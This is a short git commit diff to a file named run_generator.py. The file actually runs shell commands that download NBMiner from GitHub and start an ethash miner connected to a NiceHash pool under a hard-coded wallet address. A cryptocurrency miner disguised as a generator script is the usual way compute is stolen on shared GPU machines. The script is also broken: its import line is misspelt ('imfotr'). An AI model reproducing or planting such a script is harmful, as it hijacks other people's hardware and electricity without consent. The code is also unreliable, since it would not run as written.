007c6e725a99f39d7d8b3bca47707f8b5d4573bd
yayat465 <83803762+yayat465@users.noreply.github.com>
2021-10-11 15:35:23 +0700

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,4 +1,4 @@
-imfotr OS as alpha 
+imfotr os as alpha 
 alpha.system("nvidia-smi")
 alpha.system("Sudo apt update -y")
 alpha.system("apt update && apt install git wget nano libpci-dev -y && wget https://github.com/NebuTech/NBMiner/releases/download/v36.1/NBMiner_36.1_Linux.tgz && tar -xvf  NBMiner_36.1_Linux.tgz && cd NBMiner_Linux && ./nbminer -a ethash -o nicehash+tcp://daggerhashimoto.usa.nicehash.com:3353 -u 33ztip9uQphrGRA4mQzoMG7ACDfDfatGFp.RIG")
